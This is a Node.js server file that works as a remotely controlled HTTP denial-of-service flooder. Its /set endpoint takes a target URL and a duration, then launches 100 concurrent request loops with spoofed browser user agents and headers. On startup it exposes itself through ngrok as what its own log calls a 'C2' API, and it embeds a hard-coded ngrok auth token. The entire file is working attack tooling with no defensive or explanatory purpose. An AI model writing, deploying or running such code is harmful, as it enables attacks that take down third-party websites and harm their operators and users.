// server.js
const express = require('express');
const cors = require('cors');
const http2 = require('http2-wrapper');
const { exec } = require('child_process');

const app = express();
const PORT = 13019;

app.use(cors());
app.use(express.json());

let attacking = false;

const userAgents = [
  "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/114.0.0.0 Safari/537.36",
  "Mozilla/5.0 (Macintosh; Intel Mac OS X 12_6_5) AppleWebKit/605.1.15 Safari/605.1.15",
  "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/114.0.0.0 Safari/537.36",
  "Mozilla/5.0 (Linux; Android 13) AppleWebKit/537.36 Chrome/114.0.0.0 Mobile Safari/537.36"
];

const defaultHeaders = {
  "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
  "Accept-Language": "en-US,en;q=0.5",
  "Cache-Control": "no-cache",
  "Pragma": "no-cache",
  "Connection": "keep-alive",
  "Upgrade-Insecure-Requests": "1",
  "Sec-Fetch-Dest": "document",
  "Sec-Fetch-Mode": "navigate",
  "Sec-Fetch-Site": "none",
  "Sec-Fetch-User": "?1"
};

function randomUserAgent() {
  return userAgents[Math.floor(Math.random() * userAgents.length)];
}

async function sendRequest(target) {
  try {
    await http2.get(target, {
      headers: {
        ...defaultHeaders,
        "User-Agent": randomUserAgent(),
      },
      timeout: 5000,
    });
  } catch (_) {}
}

async function flood(target, duration) {
  const stopAt = Date.now() + duration * 1000;
  while (Date.now() < stopAt) {
    await sendRequest(target);
  }
}

app.post('/set', async (req, res) => {
  if (attacking) return res.status(429).json({ msg: "Attack already running" });

  const { target, time } = req.body;
  if (!target || !time) return res.status(400).json({ msg: "Missing target or time" });

  attacking = true;
  res.json({ msg: `Attack started on ${target} for ${time} seconds` });

  const threads = 100;
  const promises = [];
  for (let i = 0; i < threads; i++) {
    promises.push(flood(target, time));
  }
  await Promise.all(promises);
  attacking = false;
});

app.listen(PORT, () => {
  console.log(`Server running on port ${PORT}`);
  exec(`ngrok authtoken 2xclrXeyimoudAtLmDQu7DibbSJ_42dYjd7bccEoCS23svLnA`, () => {
    const ngrokProcess = exec(`ngrok http ${PORT} --log=stdout`);
    ngrokProcess.stdout.on('data', (data) => {
      if (data.includes('msg="started tunnel"')) {
        const match = data.match(/url=(https?:\/\/[^\s]+)/);
        if (match) {
          console.log('API C2NYA :', match[1]);
          console.log(`TERHUBUNG KE : ${match[1]}`);
        }
      }
      process.stdout.write(data);
    });
    ngrokProcess.stderr.on('data', (data) => {
      process.stderr.write(data);
    });
  });
});
